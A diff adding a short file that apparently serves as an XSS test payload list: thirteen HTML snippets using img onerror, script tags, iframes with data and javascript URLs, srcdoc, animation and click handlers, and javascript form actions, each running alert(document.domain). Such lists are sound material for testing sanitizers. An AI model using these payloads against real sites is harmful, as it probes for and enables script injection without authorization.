@@ -1,0 +1,13 @@
+<img src="0" onerror="alert(document.domain)">
+<script>
+  alert(document.domain);
+</script>
+<iframe src="data:text/html," onload="alert(document.domain)"></iframe>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<iframe src="data:text/html,<script>alert(document.domain);</script>"></iframe>
+<iframe srcdoc="<img src=0 onerror=alert(document.domain)>"></iframe>
+<a onclick="alert(document.domain)">Click Me!</a>
+<style>@keyframes x{}</style>
+<a style="animation-name:x" onanimationend="alert(document.domain)"></a>
+<a href="javascript:alert(document.domain)">Click Me</a>
+<form action="javascript:alert(document.domain)"><button type="submit">Click Me</button></form>
